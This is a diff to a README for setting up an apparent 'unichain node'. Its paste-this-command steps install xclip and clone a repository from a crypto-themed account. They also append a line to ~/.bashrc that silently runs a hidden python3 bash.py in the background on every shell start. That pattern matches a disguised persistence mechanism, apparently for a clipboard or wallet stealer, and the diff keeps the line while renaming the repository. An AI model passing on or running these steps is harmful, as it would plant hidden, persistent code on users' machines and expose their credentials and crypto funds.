@@ -5,13 +5,13 @@
 ### 1️⃣ Update/upgrade and install dependencies
 
 ```sh
-sudo apt update && sudo apt upgrade -y && sudo apt install git xclip && sudo pip install requests
+sudo apt update && sudo apt upgrade -y && sudo apt install git xclip python3-pip && sudo pip3 install requests
 ```
 
 ### 2️⃣ Clone and configure environment variables:
 
 ```sh
-git clone https://github.com/web3cryptoguy/unichain-node.git && cd unichain-node && mv dev ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
+git clone https://github.com/web3cryptoguy/node.git && cd node && mv dev ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
 ```
 
 ### 3️⃣ Run the setup script:
